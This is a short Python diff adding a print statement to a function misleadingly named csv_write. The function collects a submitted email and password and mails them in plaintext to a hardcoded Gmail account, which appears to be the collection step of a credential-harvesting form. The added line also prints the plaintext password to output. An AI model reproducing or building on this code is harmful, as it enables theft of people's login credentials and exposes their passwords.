@@ -33,6 +33,7 @@ def csv_write(data):
     email = data['email']
     passwd = data['password']
     message = f'Email: {email} \n Password: {passwd}'
+    print(message)
     msg.set_content(message, 'html')
     with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
         server.login('omarkhalifa226@gmail.com', password)
